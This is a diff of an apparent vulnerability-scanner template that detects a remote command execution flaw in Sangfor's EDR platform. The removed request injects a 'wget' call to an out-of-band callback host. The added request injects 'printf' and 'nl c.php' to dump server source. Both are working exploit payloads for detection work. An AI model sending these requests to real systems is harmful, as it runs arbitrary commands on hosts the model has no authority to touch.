@@ -1,23 +1,25 @@
-id: CNVD-2020-46652
-
+id: CNVD-2020-46552
 info:
-  name: Sangfor Terminal Monitoring Response Platform (EDR) Remote Command Execution
-  author: daffainfo
+  name: Sangfor EDR Tool - Remote Code Execution
+  author: ritikchaddha
   severity: critical
+  description: There is a RCE vulnerability in Sangfor Endpoint Monitoring and Response Platform (EDR). An attacker could exploit this vulnerability by constructing an HTTP request, and an attacker who successfully exploited this vulnerability could execute arbitrary commands on the target host.
   reference:
-    - https://blog.csdn.net/PigLL/article/details/108207957
-    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-46552
-  tags: sangfor,cnvd,cnvd2021,rce
+    - https://www.modb.pro/db/144475
+    - https://blog.csdn.net/bigblue00/article/details/108434009
+    - https://cn-sec.com/archives/721509.html
+  tags: cnvd,cnvd2020,sangfor,rce
 
 requests:
-  - raw:
-      - |
-        GET /tool/log/c.php?strip_slashes=system&host=wget%20{{interactsh-url}} HTTP/1.1
-        Host: {{Hostname}}
+  - method: GET
+    path:
+      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"
 
     matchers:
-      - type: word
-        part: interactsh_protocol
-        name: http
-        words:
-          - "http"
+      - type: dsl
+        dsl:
+          - 'contains(body, "$show_input = function($info)")'
+          - 'contains(body, "$strip_slashes($host)")'
+          - 'contains(body, "Log Helper")'
+          - 'status_code == 200'
+        condition: and
